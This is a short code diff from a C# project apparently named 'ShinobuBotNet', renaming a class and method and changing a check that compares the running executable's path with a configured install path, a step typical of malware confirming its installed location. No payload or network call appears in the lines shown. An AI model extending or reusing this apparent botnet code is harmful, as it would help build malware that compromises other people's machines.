@@ -2,15 +2,15 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Reflection;
+using System.Windows.Forms;
 
 namespace ShinobuBotNet
 {
-    class cheaker
+    class check
     {
-        public static bool CheakDir()
+        public static bool CheckDir()
         {
-            if(Assembly.GetExecutingAssembly().Location == configs.FullPath)
+            if (Application.ExecutablePath == config.InstallPath)
             {
                 return true;
             }
